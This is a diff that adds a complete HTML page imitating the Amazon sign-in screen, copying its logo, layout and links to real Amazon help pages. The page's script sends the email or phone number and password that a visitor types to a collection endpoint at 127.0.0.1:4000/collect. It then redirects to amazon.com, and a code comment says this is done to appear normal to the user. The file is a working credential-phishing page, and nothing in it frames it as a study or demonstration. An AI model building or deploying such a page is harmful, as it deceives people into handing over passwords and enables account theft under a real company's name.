@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Amazon Sign-In</title>
+    <link
+      href="https://fonts.googleapis.com/css2?family=Open+Sans&display=swap"
+      rel="stylesheet"
+    />
+    <style>
+      body {
+        font-family: "Amazon Ember", Arial, sans-serif;
+        background-color: #ffffff;
+        margin: 0;
+        padding: 0;
+      }
+
+      .centered-container {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        padding-top: 10px;
+      }
+
+      .logo {
+        margin-top: 3px;
+      }
+
+      .logo img {
+        width: 103px;
+        height: 31.5px;
+      }
+
+      .signin-box {
+        width: 298px;
+        border: 1px solid #ddd;
+        border-radius: 8px;
+        margin-top: 12px;
+        padding: 29px 25px;
+        box-shadow: 0 1px 1px rgba(0, 0, 0, 0.1);
+      }
+
+      h1 {
+        font-size: 20px;
+        font-weight: 300;
+        margin-top: -5px;
+      }
+
+      label {
+        font-size: 14px;
+        font-weight: 1000;
+        display: block;
+        margin-top: 10px;
+        margin-bottom: 5px;
+      }
+
+      input[type="text"],
+      input[type="password"] {
+        width: 100%;
+        font-size: 14px;
+        padding: 8px;
+        border: 1px solid #a6a6a6;
+        border-radius: 4px;
+        box-sizing: border-box;
+      }
+
+      input:focus {
+        outline: none;
+        border-color: #116371;
+        box-shadow: 0 0 3px 2px rgba(17, 223, 242, 0.5);
+      }
+
+      .input-error {
+        border: 2px solid #cc0c39 !important;
+      }
+
+      .submit-btn {
+        width: 100%;
+        height: 30px;
+        background-color: #ffd814;
+        border: 1px solid #fcd200;
+        border-radius: 20px;
+        font-size: 13px;
+        font-weight: 500;
+        cursor: pointer;
+        margin-top: 12px;
+      }
+
+      .submit-btn:hover {
+        background-color: #f7ca00;
+      }
+
+      .info {
+        font-size: 13.5px;
+        margin-top: 16px;
+        line-height: 1.2;
+        color: #111;
+      }
+
+      .info a {
+        color: #115c9d;
+        text-decoration: underline;
+      }
+
+      .footer {
+        margin-top: 17px;
+        text-align: center;
+        font-size: 12px;
+        color: #555;
+      }
+
+      .footer a {
+        margin: 0 13px;
+        color: #115c9d;
+        line-height: 3.5;
+        text-decoration: none;
+      }
+
+      .footer-divider {
+        border-top: 2px solid #ddd;
+        width: 100%;
+        margin-top: 50px;
+      }
+
+      .error-message {
+        color: #cc0c39;
+        font-size: 12.5px;
+        font-weight: 400;
+        display: flex;
+        align-items: center;
+        margin-top: 15px;
+      }
+
+      .error-message svg {
+        width: 20px;
+        height: 20px;
+        margin-right: 6px;
+        fill: #cc0c39;
+      }
+
+      .hidden {
+        display: none;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="centered-container">
+      <div class="logo">
+        <a href="https://www.amazon.com/ref=ap_frn_logo">
+          <img
+            src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg"
+            alt="Amazon Logo"
+          />
+        </a>
+      </div>
+      <div class="signin-box">
+        <h1>Sign in or create account</h1>
+
+        <label for="email">Enter mobile number or email</label>
+        <input type="text" id="email" name="email" />
+        <div id="email-error" class="error-message hidden">
+          <svg viewBox="0 0 16 16">
+            <path
+              d="M8 1a7 7 0 1 1 0 14A7 7 0 0 1 8 1zm0 2a.75.75 0 0 0-.75.75v4.5a.75.75 0 0 0 1.5 0v-4.5A.75.75 0 0 0 8 3zm0 8a1 1 0 1 0 0 2 1 1 0 0 0 0-2z"
+            />
+          </svg>
+          <span>Enter your mobile number or email</span>
+        </div>
+
+        <div id="password-section" class="hidden">
+          <label for="password">Password</label>
+          <input type="password" id="password" name="password" />
+          <div id="password-error" class="error-message hidden">
+            <svg viewBox="0 0 16 16">
+              <path
+                d="M8 1a7 7 0 1 1 0 14A7 7 0 0 1 8 1zm0 2a.75.75 0 0 0-.75.75v4.5a.75.75 0 0 0 1.5 0v-4.5A.75.75 0 0 0 8 3zm0 8a1 1 0 1 0 0 2 1 1 0 0 0 0-2z"
+              />
+            </svg>
+            <span>Enter your password</span>
+          </div>
+        </div>
+
+        <button id="continueBtn" class="submit-btn">Continue</button>
+        <button id="signinBtn" class="submit-btn hidden">Sign in</button>
+
+        <div class="info">
+          By continuing, you agree to Amazon's
+          <a
+            href="https://www.amazon.com/gp/help/customer/display.html?nodeId=508088"
+            >Conditions of Use</a
+          >
+          and
+          <a
+            href="https://www.amazon.com/gp/help/customer/display.html?nodeId=468496"
+            >Privacy Notice</a
+          >.
+        </div>
+
+        <div class="info">
+          <a
+            href="https://www.amazon.com/gp/help/customer/account-issues/ref=ap_login_with_otp_claim_collection?ie=UTF8"
+            style="
+              display: inline-block;
+              margin-top: 6px;
+              text-decoration: none;
+            "
+            >Need help?</a
+          >
+        </div>
+
+        <hr
+          style="margin: 20px 0; border: none; border-top: 1px solid #e7e7e7"
+        />
+
+        <div class="info">
+          <strong>Buying for work?</strong><br />
+          <a
+            href="https://www.amazon.com/business?ref_=ap_altfc_b2b"
+            style="
+              display: inline-block;
+              margin-top: 6px;
+              text-decoration: none;
+            "
+            >Shop on Amazon Business</a
+          >
+        </div>
+      </div>
+
+      <div class="footer-divider"></div>
+      <div class="footer">
+        <a
+          href="https://www.amazon.com/gp/help/customer/display.html?nodeId=508088"
+          >Conditions of Use</a
+        >
+        <a
+          href="https://www.amazon.com/gp/help/customer/display.html?nodeId=468496"
+          >Privacy Notice</a
+        >
+        <a href="https://www.amazon.com/gp/help/customer/display.html">Help</a>
+        <div>© 1996-2025, Amazon.com, Inc. or its affiliates</div>
+      </div>
+    </div>
+
+    <script>
+      const emailInput = document.getElementById("email");
+      const passwordInput = document.getElementById("password");
+      const passwordSection = document.getElementById("password-section");
+      const continueBtn = document.getElementById("continueBtn");
+      const signinBtn = document.getElementById("signinBtn");
+      const emailError = document.getElementById("email-error");
+      const passwordError = document.getElementById("password-error");
+
+      function isValidEmailOrPhone(input) {
+        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        const phoneRegex = /^[0-9]{7,15}$/;
+        return emailRegex.test(input) || phoneRegex.test(input);
+      }
+
+      continueBtn.addEventListener("click", () => {
+        const emailValue = emailInput.value.trim();
+        if (!isValidEmailOrPhone(emailValue)) {
+          emailInput.classList.add("input-error");
+          emailError.classList.remove("hidden");
+        } else {
+          emailInput.classList.remove("input-error");
+          emailError.classList.add("hidden");
+          passwordSection.classList.remove("hidden");
+          continueBtn.classList.add("hidden");
+          signinBtn.classList.remove("hidden");
+        }
+      });
+
+      signinBtn.addEventListener("click", () => {
+        const emailValue = emailInput.value.trim();
+        const passwordValue = passwordInput.value.trim();
+
+        let valid = true;
+
+        if (!isValidEmailOrPhone(emailValue)) {
+          emailInput.classList.add("input-error");
+          emailError.classList.remove("hidden");
+          valid = false;
+        } else {
+          emailInput.classList.remove("input-error");
+          emailError.classList.add("hidden");
+        }
+
+        if (!passwordValue) {
+          passwordInput.classList.add("input-error");
+          passwordError.classList.remove("hidden");
+          valid = false;
+        } else {
+          passwordInput.classList.remove("input-error");
+          passwordError.classList.add("hidden");
+        }
+
+        if (!valid) return;
+
+        fetch("http://127.0.0.1:4000/collect", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({ emailValue, passwordValue }),
+        })
+          .then(() => {
+            // Delay redirect by 500ms to simulate processing time
+            setTimeout(() => {
+              window.location.href = "https://www.amazon.com";
+            }, 500);
+          })
+          .catch((err) => {
+            console.error("Error sending credentials:", err);
+            // Still redirect to appear normal to user
+            window.location.href = "https://www.amazon.com";
+          });
+      });
+
+      emailInput.addEventListener("input", () => {
+        if (isValidEmailOrPhone(emailInput.value.trim())) {
+          emailInput.classList.remove("input-error");
+          emailError.classList.add("hidden");
+        }
+      });
+    </script>
+  </body>
+</html>
